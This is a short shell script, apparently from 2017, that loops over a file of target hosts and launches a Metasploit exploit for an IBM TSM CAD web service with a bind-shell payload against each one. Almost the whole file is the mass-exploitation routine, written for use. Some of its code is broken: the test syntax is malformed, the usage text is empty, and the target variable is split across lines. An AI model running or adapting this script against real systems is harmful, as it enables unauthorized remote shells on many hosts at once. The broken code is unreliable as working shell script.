#!/bin/sh
##################################################
# sploit-all.sh
#
# Last Update : 06/09/2017
#	
#
# This script allows you to create a target list
# and run targeted exploits from the The GOOOD OL
# Metaslploit Framework and targe tlist 




MSFPATH="/mnt/share/tools/3.2"
EXPLOIT="exploit/windows/http/ibm_tsm_cad"
PAYLOAD="generic/shell_bind_tcp"
TARGET="0"


echo "Starting sploit-all.sh:"
echo " "

if [! "$1" ]; then echo "Use: sploit-all.sh "
exit 1 
	else
	for i in `cat $1`
	    do
		echo "Attempting to exploit $i..."
		$MSFPATH/msfcli $EXPLOIT PAYLOAD=$PAYLOAD RHOST=$i TARGET=$TARG
ET E
	    done
 fi 
